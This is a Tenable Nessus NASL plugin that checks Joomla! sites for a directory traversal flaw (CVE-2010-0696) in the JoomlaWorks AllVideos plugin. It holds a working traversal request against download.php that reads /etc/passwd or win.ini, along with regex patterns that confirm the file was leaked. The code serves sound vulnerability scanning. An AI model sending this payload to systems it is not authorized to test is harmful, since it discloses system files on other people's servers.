#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(44689);
  script_version("$Revision: 1.13 $");
  script_cvs_date("$Date: 2017/05/19 13:58:07 $");

  script_cve_id("CVE-2010-0696");
  script_bugtraq_id(38238);
  script_osvdb_id(62331);
  script_xref(name:"EDB-ID", value:"11447");
  script_xref(name:"Secunia", value:"38587");

  script_name(english:"Joomla! JoomlaWorks AllVideos Plugin 'file' Parameter Directory Traversal");
  script_summary(english:"Attempts to read a local file through 'file' parameter.");

  script_set_attribute(attribute:"synopsis",value:
"The remote web server contains a PHP application that is affected by
an information disclosure vulnerability.");
  script_set_attribute(attribute:"description",value:
"The version of the JoomlaWorks AllVideos plugin for Joomla! running
on the remote host is affected by an information disclosure
vulnerability due to improper sanitization of user-supplied input to
the 'file' parameter before using it in the
/plugins/content/jw_allvideos/includes/download.php script to return
the contents of a file. An unauthenticated, remote attacker can
exploit this issue, by prefixing the parameter with directory
traversal strings, such as '..\\', to disclose arbitrary files on the
remote host, subject to the privileges of the web server user ID.");
   # http://web.archive.org/web/20110501135319/http://www.joomlaworks.gr/content/view/77/34/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?251012a1");
  script_set_attribute(attribute:"solution", value:
"Upgrade to JoomlaWorks AllVideos plugin version 3.3 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:P/RL:U/RC:X");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(22);

  script_set_attribute(attribute:"vuln_publication_date",value:"2010/02/14");
  script_set_attribute(attribute:"patch_publication_date",value:"2010/02/18");
  script_set_attribute(attribute:"plugin_publication_date",value:"2010/02/23");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:joomla:joomla\!");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2017 Tenable Network Security, Inc.");

  script_dependencies("joomla_detect.nasl", "os_fingerprint.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("installed_sw/Joomla!", "www/PHP");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

app = "Joomla!";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

plugin = "JoomlaWorks AllVideos";

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  regexes = make_list();
  regexes[0] = make_list('<name>AllVideos', 'JoomlaWorks');
  checks["/plugins/content/jw_allvideos.xml"] = regexes;

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext    : plugin
  );
}
if (!installed) audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " plugin");

# Try to retrieve a local file.
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os)
    files = make_list('/windows/win.ini','/winnt/win.ini');
  else
    files = make_list('/etc/passwd');
}
else files = make_list('/etc/passwd', '/windows/win.ini', '/winnt/win.ini', 'LICENSE.php');

file_pats = make_array();
file_pats['/etc/passwd'] = "root:.*:0:[01]:";
file_pats['/winnt/win.ini'] = "^\[[a-zA-Z\s]+\]|^; for 16-bit app support";
file_pats['/windows/win.ini'] = "^\[[a-zA-Z\s]+\]|^; for 16-bit app support";
file_pats['LICENSE.php'] = "GNU GENERAL PUBLIC LICENSE";

foreach file (files)
{
  if ("LICENSE.php" >< file)
    traversal = '../';
  else
    traversal = '../../../../../../../../../..';

  url = '/plugins/content/jw_allvideos/includes/download.php?file=images/' +
    traversal + file ;

  res = http_send_recv3(
    method : "GET",
    item   : dir +url,
    port   : port,
    exit_on_fail : TRUE
  );

  if(egrep(pattern:file_pats[file], string:res[2]))
  {
    if (os && "Windows" >< os)
      file = str_replace(find:'/', replace:'\\', string:file);

    security_report_v4(
      port        : port,
      severity    : SECURITY_WARNING,
      file        : file,
      request     : make_list(install_url + url),
      output      : chomp(res[2]),
      attach_type : 'text/plain'
    );
    exit(0);
  }
}
audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " plugin");
